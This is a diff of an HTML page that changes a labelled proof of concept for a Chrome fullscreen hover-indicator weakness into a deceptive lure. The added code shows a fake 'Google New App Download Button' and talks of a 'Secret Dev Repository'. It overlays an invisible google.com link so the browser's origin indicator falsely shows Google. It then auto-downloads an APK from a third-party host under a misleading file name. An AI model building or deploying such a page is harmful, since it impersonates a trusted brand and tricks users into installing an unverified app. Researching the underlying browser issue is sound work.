@@ -1,112 +1,97 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>Fullscreen Hover Indicator UI Behavior</title>
-<style>
-  body {
-    margin: 0;
-    background: #111;
-    color: white;
-    font-family: sans-serif;
-    height: 100vh;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-  }
-  button {
-    padding: 14px 24px;
-    font-size: 18px;
-    cursor: pointer;
-  }
-</style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Fullscreen + Delayed Download</title>
+  <style>
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      font-family: sans-serif;
+      background: black;
+      color: white;
+    }
+    button {
+      font-size: 20px;
+      padding: 12px 24px;
+      cursor: pointer;
+    }
+  </style>
 </head>
 <body>
+  <button id="startBtn">Google New App Download Button</button>
 
-<button id="start">Start Demo</button>
+  <script>
+    const btn = document.getElementById("startBtn");
 
-<script>
-/* Exit fullscreen handler — direct replace so Back button cannot return */
-document.addEventListener("fullscreenchange", () => {
-  if (!document.fullscreenElement) {
-    window.location.replace("https://google.com");
-  }
-});
-
-document.getElementById("start").onclick = async () => {
-
-  // Enter fullscreen
-  if (document.documentElement.requestFullscreen)
-    await document.documentElement.requestFullscreen();
-
-  // Replace page content
-  document.body.innerHTML = `
-    <a id="overlayLink" href="https://google.com"></a>
-
-    <div id="centerText" style="
-      position: fixed;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      z-index: 10;
-      font-size: 20px;
-      text-align: center;
-    ">
-      Move your cursor — Chrome may show a hover indicator of “google.com”.<br><br>
-      A safe local-only file will download shortly.<br><br>
-      Press ESC to exit fullscreen (immediate redirect).
-      <p style="opacity:.6;font-size:14px;margin-top:20px;">
-        This PoC is safe. Downloads a harmless dummy .apk NO EXPLOIT file.
-      </p>
-
-      <div style="opacity:.5; font-size:14px; margin-top:30px;">
-        <b>Expected:</b> Fullscreen hides browser UI.<br>
-        <b>Actual:</b> Hover origin preview still appears.
-      </div>
-    </div>
-
-    <style>
-      #overlayLink {
-        position: fixed;
-        inset: 0;
-        background: transparent;
-        z-index: 1;
+    btn.addEventListener("click", async () => {
+      // Step 1: Request fullscreen
+      if (document.documentElement.requestFullscreen) {
+        await document.documentElement.requestFullscreen();
+      } else if (document.documentElement.webkitRequestFullscreen) {
+        await document.documentElement.webkitRequestFullscreen();
       }
-      html, body {
-        height: 100%;
-        margin: 0;
-        overflow: hidden;
-      }
-    </style>
 
-    <div id="hoverLog" style="
-      position:fixed;
-      bottom:20px;
-      left:20px;
-      color:#0f0;
-      font-size:14px;
-      opacity:.7;
-      z-index:9999;
-    ">Hover status: waiting for movement...</div>
-  `;
+      // Step 2: Show initial message
+      document.body.innerHTML = `
+        <div style="text-align:center; font-size:22px;">
+          Please wait a few seconds! We will redirect you to Google's Secret Dev Repository.
+        </div>
+      `;
 
-  // Hover log update
-  window.addEventListener("mousemove", () => {
-    const log = document.getElementById("hoverLog");
-    if (log) log.textContent = "Hover status: Chrome showing origin indicator (google.com)";
-  });
+      // Step 3: Wait 3 seconds, then replace with the invisible link setup
+      setTimeout(() => {
+        document.body.innerHTML = `
+          <a href="https://google.com" id="fullPageLink"></a>
+          <div id="downloadStatus" style="text-align:center; font-size:22px;">
+            You on google.com now! check the left/right corner origin indicator
+          </div>
 
-  // SAFE dummy download (.bin file)
-  setTimeout(() => {
-    const a = document.createElement("a");
-    a.href = "https://ecdnts-del.github.io/test-apk/dummy.apk";
-    a.download = "dummy.bin"; // harmless binary file
-    document.body.appendChild(a);
-    a.click();
-    a.remove();
-  }, 2000);
-};
-</script>
+          <style>
+            html, body {
+              height: 100%;
+              margin: 0;
+              background: black;
+              overflow: hidden;
+            }
+            #fullPageLink {
+              position: fixed;
+              top: 0;
+              left: 0;
+              width: 100%;
+              height: 100%;
+              background: transparent;
+              z-index: 1;
+            }
+            #downloadStatus {
+              position: fixed;
+              top: 50%;
+              left: 50%;
+              transform: translate(-50%, -50%);
+              z-index: 2;
+              color: white;
+            }
+          </style>
+        `;
 
+        // Step 4: Wait another 3 seconds, then trigger the download
+        setTimeout(() => {
+          const a = document.createElement("a");
+          a.href = "https://frozzipies.github.io/googlebeta.apk"; // your hosted image
+          a.download = "test.png";
+          document.body.appendChild(a);
+          a.click();
+          a.remove();
+
+          // Update text after download starts
+          document.getElementById("downloadStatus").textContent = "Download started!";
+        }, 7000);
+      }, 5000);
+    });
+  </script>
 </body>
 </html>
